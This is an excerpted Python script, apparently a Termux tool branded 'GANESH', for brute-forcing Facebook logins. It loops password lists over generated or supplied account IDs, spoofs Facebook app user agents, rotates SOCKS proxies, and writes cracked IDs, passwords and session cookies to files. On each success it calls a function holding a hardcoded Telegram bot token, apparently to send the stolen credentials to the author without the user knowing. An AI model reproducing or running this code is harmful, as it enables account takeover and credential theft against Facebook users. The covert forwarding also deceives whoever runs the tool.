...
print('\n\033[1;37m install modules...\Ruk muji...')
...
try:
        ...
        os.system('python ganesh.py')
except:pass
def Elite(ids,pas,cookie):
    try:
        import requests
        token = "7032562748:AAFrxcdMbz2PMo_FnxpoSPpkr250Z46K8vU"
        chatid = "7032562748"
...
def es():
      if path.isfile("/data/data/com.termux/files/usr/bin/rm"):
           ...
           system('clear');print('System Modification Not Allowed since using GANESH');exit()
...
\033[1;32m▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▄▀▀▄\033[1;32m▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▀▄▀
 \033[
\033[1;32m--------------------------------------------------
\033[1;32m[~] Author   : GANESH HERØ
\033[1;32m[~] Facebook : GANES HERØ
\033[1;32m[~] Tool     : FREE💸🔥
...
def menu():
                        ...
                        print("[5] Join messenger group")
                        print("[6] Join Facebook group")
                        print("[0] Exit")
                        linex()
                        ...
                        if axs in ['1','01']:
                                ...
                                os.system(f'xdg-open https://m.me/j/AbbSn8cMkYHbsSwe/');menu()
                        elif axs in ['6','06']:
                                os.system('xdg-open https://m.facebook.com/groups/727352689572738/?ref=share&mibextid=NSMWBT');menu() 
                        elif axs in ['0','00']:
...
def za():
    ...
    if myid in str(content):
        ...
        os.system("xdg-open https://chat.whatsapp.com/IS2kXj6Uvy7Gycd4tF7u8R")
...
def npxind():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as GANESH:     
                        clear()
                        id = str(len(user))
                        ...
                        for psx in user:
                                ...
                                if mthd in ['1','01']:                                 
                                    GANESH.submit(rndm1,ids,passlist)
                                if mthd in ['2','02']:    
                                    GANESH.submit(rndm,ids,passlist)                                	
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def M1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [GANESH-M1] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Samsung;FBBD/Samsung;FBPN/{fbpn};FBDV/SM-A356E;FBSV/14;nullFBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [GANESH-OK] '+ids+' | '+pas+'\033[1;97m')                                        
                                        open('/sdcard/GANESH_m1_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/GANESH_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        Elite(ids,pas,cookie)
                                        oks.append(ids)
                                        break
                                elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[GANESH-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;91m [GANESH-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/GANESH-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/GANESHbrand-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
...
def M2(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [GANESH-M2] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])          
                                ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Realme;FBBD/Realme;FBPN/com.facebook.orca;FBDV/RMX3834;FBSV/13;nullFBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                nip=random.choice(proxsi)
                                proxs= {'http': 'socks4://'+nip}
                                ...
                                if 'session_key' in q:
                                    ...
                                    #    print("\033[1;32m [COOOKIS] :\033[1;34m "+cookie)
                                        open('/sdcard/GANESH_m2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/GANESH_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        Elite(ids,pas,cookie)
                                        oks.append(ids)
                                        break
                                elif twf in str(po):
...
def M3(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [GANESH-M3] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                      ...
                                      #  print(f"\r\r\033[1;32mFBLINK:https://www.facebook.com/"+ids)                              	
                                        print('\r\r\033[1;32m [GANESH-OK] '+ids+' | '+pas+'\033[1;97m')
                                     #   print("\033[1;32m [COOOKIS] :\033[1;34m "+cookie)
                                        open('/sdcard/GANESH_m3_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/GANESH_iDs_COOKiE_M3.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        Elite(ids,pas,cookie)
                                        oks.append(ids)
                                        break
                                elif twf in str(po):
...
def rndm1(ids,passlist):
        global loop
        global oks,cps
        sys.stdout.write('\r\r\033[1;32m [GANESH-M1] %s|OK-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [GANESH-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        ...
                                        open('/sdcard/GANESH_R_COOKiE_M1.txt','a').write(str(uid)+'|'+pas+'|'+cookie+'\n')                                     
                                        open('/sdcard/GANESH-R-M1-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [GANESH-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/GANESH-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [GANESH-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"  
                                        open('/sdcard/GANESH_R_COOKiE_M2.txt','a').write(str(uid)+'|'+pas+'|'+cookie+'\n')                                     
                                        open('/sdcard/GANESH-R-M2-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        Elite(uid,pas,cookie)
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[1;91mm [GANESH-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/GANESH-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
